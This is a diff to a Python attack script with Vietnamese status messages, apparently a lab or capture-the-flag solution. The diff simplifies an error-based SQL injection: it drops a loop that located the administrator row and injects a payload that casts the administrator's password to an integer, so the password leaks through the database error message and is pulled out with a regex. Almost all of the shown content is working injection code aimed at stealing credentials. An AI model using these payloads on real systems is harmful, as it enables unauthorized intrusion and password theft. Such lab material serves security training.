@@ -22,23 +22,8 @@ def make_request(payload):
     res = s.get("https://" + host + path, headers=headers, cookies=cookies)
     return res
 
-print("[+] Đang tìm vị trí tài khoản administrator...")
-p_u = 0
-for x in range(1, 50):
-    payload_position = f"' AND CAST((SELECT username FROM users LIMIT {x}) As int)=1 -- -"
-    res = make_request(payload_position)
-    
-    if "administrator" in res.text:
-        p_u = x
-        print(f"[*] Tài khoản admin nằm tại hàng: {p_u}")
-        break
-
-if p_u == 0:
-    print("[-] Không tìm thấy hàng của administrator.")
-    exit()
-
 print("[+] Đang lấy password qua thông báo lỗi...")
-payload_find_password = f"' AND CAST((SELECT password FROM users LIMIT {p_u}) As int)=1 -- -"
+payload_find_password = "' AND CAST((SELECT password FROM users WHERE username='administrator') As int)=1 -- -"
 res = make_request(payload_find_password)
 match = re.search(r'invalid input syntax for type integer: "([^"]*)"', res.text)
 
